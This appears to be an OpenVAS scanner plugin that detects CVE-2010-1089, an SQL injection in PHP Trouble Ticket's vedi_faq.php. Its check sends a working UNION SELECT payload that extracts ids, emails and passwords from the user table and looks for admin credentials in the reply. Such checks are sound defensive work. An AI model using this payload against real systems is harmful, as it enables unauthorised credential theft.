###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_phptroubleticket_sql_injection.nasl 14 2013-10-27 12:33:37Z jan $
#
# Phptroubleticket 'vedi_faq.php' SQL Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause SQL Injection attack
  and gain sensitive information.
  Impact Level: Application";
tag_affected = "PHP Trouble Ticket 2.2 and prior";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the 'id'
  parameter in vedi_faq.php that allows attacker to manipulate SQL queries by
  injecting arbitrary SQL code.";
tag_solution = "No solution or patch is available as of 31st March, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.phptroubleticket.org/downloads.html";
tag_summary = "This host is running PHP Trouble Ticket and is prone to SQL
  injection vulnerabilities.";

if(description)
{
  script_id(901101);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-04-01 11:04:35 +0200 (Thu, 01 Apr 2010)");
  script_cve_id("CVE-2010-1089");
  script_bugtraq_id(38486);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Phptroubleticket 'vedi_faq.php' SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/38763");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/1003-exploits/phptroubleticket-sql.txt");

  script_description(desc);
  script_summary("Check if PHP Trouble Ticket is vulnerable to SQL Injection attacks");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir (make_list("/", "/phpticket", "/phpttcket", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/index.php"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if('Powered by phptroubleticket.org' >< res)
  {
    ## Construct attack request
    req = http_get(item:string(dir,"/vedi_faq.php?id=666/**/union/**/all/**/" +
                   "select/**/1,concat_ws(0x3a,id,email,password)kaMtiEz,3,4" +
                   "/**/from/**/utenti--"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    ## Confirm exploit worked by checking the response
    if(eregmatch(pattern:"1:admin:.*", string:res))
    {
      security_hole(port);
      exit(0);
    }
  }
}
